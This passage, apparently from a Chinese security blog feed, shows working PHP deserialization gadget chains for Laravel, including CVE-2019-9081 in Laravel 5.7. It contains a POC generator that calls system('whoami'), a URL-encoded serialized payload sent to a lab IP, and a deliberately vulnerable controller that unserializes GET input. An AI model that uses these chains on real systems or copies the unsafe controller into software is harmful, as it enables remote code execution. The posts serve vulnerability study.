class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings[<span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>][<span class="string">&#x27;concrete&#x27;</span>] = <span class="string">&quot;Illuminate\Foundation\Application&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    </span><br><span class="line">    $<span class="title">defaultGenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>([1,2]);</span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        <span class="variable">$defaultGenerator</span>,</span><br><span class="line">        <span class="variable">$application</span>,</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,</span><br><span class="line">        [<span class="string">&quot;whoami&quot;</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$validgenerator</span> = <span class="keyword">new</span> Faker\ValidGenerator(<span class="keyword">array</span>(<span class="variable">$pendingcommand</span>, <span class="string">&#x27;run&#x27;</span>));</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$validgenerator</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.136.167&#x2F;index.php&#x2F;user?user&#x3D;O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A20%3A%22Faker%5CValidGenerator%22%3A3%3A%7Bs%3A12%3A%22%00%2A%00generator%22%3BO%3A28%3A%22Illuminate%5CEvents%5CDispatcher%22%3A0%3A%7B%7Ds%3A12%3A%22%00%2A%00validator%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A2%3A%7Bi%3A0%3Bi%3A1%3Bi%3A1%3Bi%3A2%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7Ds%3A10%3A%22maxRetries%22%3Bi%3A10000%3B%7Ds%3A8%3A%22%00%2A%00event%22%3Bs%3A3%3A%22xxx%22%3B%7D</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章只是为了扩展一下自己，也遇到了很多问题，学习了其他师傅的文章，才写出来</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7 反序列化 RCE复现</title>
      <link href="2021/04/12/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/04/12/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>这实际上是一个反序列化链，并不能直接命令执行，需要一个反序列化的点，这里直接给他捏一个</p><h3 id="CVE编号"><a href="#CVE编号" class="headerlink" title="CVE编号"></a>CVE编号</h3><p>CVE-2019-9081</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载一个 laravel5.7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;laravel&#x2F;laravel&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;v5.7.0.zip</span><br></pre></td></tr></table></figure><p>解压缩，然后执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd laravel</span><br><span class="line">cp .env.example .env</span><br><span class="line">composer install</span><br><span class="line">php artisan key:generate</span><br></pre></td></tr></table></figure><p>然后添加代码，造一个反序列化入口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///var/www/laravel5.7/app/Http/Controllers/userController.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">userController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$user</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/var/www/laravel5.7/routes/web.php</span></span><br><span class="line">Route::get(<span class="string">&#x27;/user&#x27;</span>, <span class="string">&#x27;userController@index&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>漏洞出现在 PendingCommand.php 文件中，我们直接来到该文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Foundation&#x2F;Testing&#x2F;PendingCommand.php</span><br></pre></td></tr></table></figure><p>看到 __destruct() ，直接调用 $this-&gt;run()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;hasExecuted = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$exitCode</span> = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoMatchingExpectationException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$e</span>-&gt;getMethodName() === <span class="string">&#x27;askQuestion&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="variable">$e</span>-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">&#x27;&quot; was asked.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="variable">$e</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>一眼看去，这里应该就是执行命令的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode &#x3D; $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span><br></pre></td></tr></table></figure><p>先随便写点东西调试一下，不知道用什么值就直接使用字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">pendingcommand</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>\<span class="title">PendingCommand</span>(</span><br><span class="line">        &quot;<span class="title">test</span>&quot;,</span><br><span class="line">        &quot;<span class="title">app</span>&quot;,</span><br><span class="line">        &quot;<span class="title">system</span>&quot;,</span><br><span class="line">        [&quot;<span class="title">whoami</span>&quot;]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成payload，丢入反序列化函数</p><h3 id="关键点1"><a href="#关键点1" class="headerlink" title="关键点1"></a>关键点1</h3><p>在 PendingCommand.php 的 <code>$this-&gt;mockConsoleOutput();</code>  处下断点，在他的下一句也下断点，这时候发现不会执行到下一句，也就是说我们必须绕过这里，我们来看看这个函数的内部结构</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mock</span> = Mockery::mock(OutputStyle::class.<span class="string">&#x27;[askQuestion]&#x27;</span>, [</span><br><span class="line">        (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$question</span>) &#123;</span><br><span class="line">        <span class="variable">$mock</span>-&gt;shouldReceive(<span class="string">&#x27;askQuestion&#x27;</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$argument</span></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$question</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$argument</span>-&gt;getQuestion() == <span class="variable">$question</span>[<span class="number">0</span>];</span><br><span class="line">            &#125;))</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$question</span>, <span class="variable">$i</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[<span class="variable">$i</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$question</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$mock</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$mock</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后单步调试，进入 <code>$this-&gt;createABufferedOutputMock()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mock</span> = Mockery::mock(BufferedOutput::class.<span class="string">&#x27;[doWrite]&#x27;</span>)</span><br><span class="line">            -&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">            -&gt;shouldIgnoreMissing();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$output</span>) &#123;</span><br><span class="line">        <span class="variable">$mock</span>-&gt;shouldReceive(<span class="string">&#x27;doWrite&#x27;</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(<span class="variable">$output</span>, Mockery::any())</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$i</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput[<span class="variable">$i</span>]);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mock</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到直接运行后发生的报错，就是在这个函数里面</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210416003329.png"></p><p>这里的意思是 <code>$this-&gt;test</code> 获取不到 expectedOutput，那这个好办，我们只要找到一个有 <code>__get()</code>函数的类，赋值给 test 就可以绕过，直接搜索，搜索到的第一个就可以用</p><p><code>Faker\DefaultGenerator</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更改一下POC就可以绕过这一步</p><p>然后来到 180 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$mock</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mock</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>由于我们的 <code>$app</code> 用的是个字符串，没有bind函数，所以会报错，因此需要找一个有 bind() 的类，这里可以用类中定义使用的 <code>Illuminate\Foundation\Application</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultGenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>([1,2]);</span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        <span class="variable">$defaultGenerator</span>,</span><br><span class="line">        <span class="variable">$application</span>,</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,</span><br><span class="line">        [<span class="string">&quot;whoami&quot;</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="关键点2"><a href="#关键点2" class="headerlink" title="关键点2"></a>关键点2</h3><p>继续调试，进入这句代码，之后继续 F7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode &#x3D; $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span><br></pre></td></tr></table></figure><p>在这里会报错，让我们定位到报错的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params"><span class="variable">$concrete</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;getLastParameterOverride());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$reflector</span> = <span class="keyword">new</span> ReflectionClass(<span class="variable">$concrete</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$reflector</span>-&gt;isInstantiable()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;notInstantiable(<span class="variable">$concrete</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面这个函数检测类是否可以实例化，而当前的 <code>$concrete</code> 值为 <code>Illuminate\Contracts\Console\Kernel</code> 是一个接口，自然就不能，就会进入下面，抛出异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$reflector-&gt;isInstantiable()</span><br></pre></td></tr></table></figure><p>因此我们需要想办法改变 <code>$concrete</code> 的值为一个可以实例化的类，我们可以来看看怎么得到的 <code>$concrete</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete &#x3D; $this-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure><p>调试可以知道，<code>$abstract</code> 的值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Contracts\Console\Kernel</span><br></pre></td></tr></table></figure><p>我们来看 getConcrete 函数，在 Container.php 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span>(<span class="params"><span class="variable">$abstract</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! is_null(<span class="variable">$concrete</span> = <span class="keyword">$this</span>-&gt;getContextualConcrete(<span class="variable">$abstract</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>][<span class="string">&#x27;concrete&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$abstract</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试可以知道，会一直向下走，直到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>][<span class="string">&#x27;concrete&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以通过反序列化控制 bindings 的值，因此可以达到更改返回值的目的，构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 